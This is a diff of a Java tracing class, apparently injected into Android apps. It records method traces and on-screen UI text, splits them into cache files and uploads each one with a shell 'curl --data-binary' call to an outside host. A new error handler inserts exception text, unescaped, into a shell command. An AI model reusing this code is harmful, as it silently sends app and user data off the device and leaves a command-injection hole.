@@ -26,6 +26,7 @@ public class MethodTrace {
 	private static String cacheDir = "/data/user/0/@PACKAGE_NAME@/cache/";
 	private static boolean recordEnabled = true;
 	private static long lastOnPause = 0L;
+	private static String lastTraceActivity = "";
 	private static String host = "http://debugger2024.atwebpages.com";
 	
 	// TODO: rework
@@ -102,13 +103,22 @@ public class MethodTrace {
 		
 	}
 	
+	private static void logStep3() {
+		
+	}
+	
 	public static void updateOnPause() {
+		StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
+		lastTraceActivity = trace.getClassName();
 		lastOnPause = System.currentTimeMillis();
+		
 	}
 	
 	public static void updateOnResume() {
+		StackTraceElement trace = new Throwable().fillInStackTrace().getStackTrace()[1];
+		
 		//Toast.makeText(ctx, String.valueOf(System.currentTimeMillis() - lastOnPause), 1000).show();
-		if (System.currentTimeMillis() - lastOnPause < 2000) {
+		if (System.currentTimeMillis() - lastOnPause < 2000 && trace.getClassName().equals(lastTraceActivity)) {
 			if (recordEnabled) {
 				//Toast.makeText(ctx, String.valueOf(runtimeDataMap.size()), 1000).show();
 				logStep2();
@@ -129,30 +139,62 @@ public class MethodTrace {
 		}
 	}
 
+    public static ArrayList<String> doPartition(String input) {
+        ArrayList<String> partitions = new ArrayList<>();
+
+        int maxSize = 500 * 1024; // max char count
+        int startIndex = 0;
+
+        while (startIndex < input.length()) {
+            int endIndex = Math.min(startIndex + maxSize, input.length());
+            String partition = input.substring(startIndex, endIndex);
+            partitions.add(partition);
+            startIndex = endIndex;
+        }
+
+        return partitions;
+    }
+
     public static void dump() {
         try {
-			//Toast.makeText(ctx, ctx.getCacheDir().toString(), Toast.LENGTH_LONG).show();
-            //write file
-			File tst = new File(cacheDir + "/out.txt");
-			
-			tst.createNewFile();
-			 FileWriter fileWriter = new FileWriter(tst);
-			 BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+            // Split to partitions
+            ArrayList<String> partitions = doPartition(recorder.toString());
+            
+            String stamp = String.valueOf(System.currentTimeMillis()); //1705140916160
 
-			 // Write contents to file
-			 bufferedWriter.write(recorder.toString());
-			 bufferedWriter.newLine();
-			 
-			 // Flush and close the writer
-			 bufferedWriter.flush();
-			 bufferedWriter.close();
-			 
+            // write file
+            int upCount = 1;
+            ArrayList<String> outNames = new ArrayList<>();
+            for (String p : partitions) {
+                // prepare
+                String outName = String.format("out%d.txt", upCount);
+                outNames.add(outName);
+                File tst = new File(cacheDir + outName); 
+                tst.createNewFile();
+                FileWriter fileWriter = new FileWriter(tst);
+                BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+
+                // Write contents to file
+                bufferedWriter.write(p);
+                bufferedWriter.write("\n");
+                bufferedWriter.write(String.format("%s-%d_of_%d", stamp, upCount++, partitions.size()));
+
+                // Flush and close the writer
+                bufferedWriter.flush();
+                bufferedWriter.close();
+            }
+            
             // Upload!! OuO v_v o.O
-			String cmd = String.format("cd %s && curl --data-binary @out.txt %s/test.php", cacheDir, host);
-            Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
-			
-        } catch (IOException e) {
-            //Toast.makeText(ctx, e.getMessage(), Toast.LENGTH_LONG).show();
+            for (String name : outNames) {
+                String cmd = String.format("cd %s && curl --data-binary @%s %s/test.php", cacheDir, name ,host);
+                Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            }
+
+        } catch (Exception e) {
+            try {
+                String cmd = String.format("cd %s && echo '%s' >> error.log", cacheDir, e.getMessage());
+                Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            } catch (Exception ee){}
         }
         recorder = new StringBuilder();
         runtimeDataMap = new HashMap<>();
@@ -165,7 +207,7 @@ public class MethodTrace {
             if (!runtimeDataMap.containsKey(fullFormat)) {
                 runtimeDataMap.put(fullFormat, true);
 				recorder.append(fullFormat);
-				recorder.append("\r\n");
+				recorder.append("\n");
             }
         }
     }
@@ -178,7 +220,7 @@ public class MethodTrace {
             String fullFormat = String.format("@General[]| %s ==>\t%s", trace.toString(), out.substring(0, Math.min(out.length(), dataLimitLength)));
             if (!runtimeDataMap.containsKey(fullFormat)) {
                 runtimeDataMap.put(fullFormat, true);
-                recorder.append("\r\n");
+                recorder.append("\n");
 				recorder.append(fullFormat);
             }
         }
@@ -191,7 +233,7 @@ public class MethodTrace {
             String fullFormat = String.format("@UIText| %s ==>\t%s", trace.toString(), data.substring(0, Math.min(data.length(), dataLimitLength)));
             if (!runtimeDataMap.containsKey(fullFormat)) {
                 runtimeDataMap.put(fullFormat, true);
-                recorder.append("\r\n");
+                recorder.append("\n");
 				recorder.append(fullFormat);
             }
         }
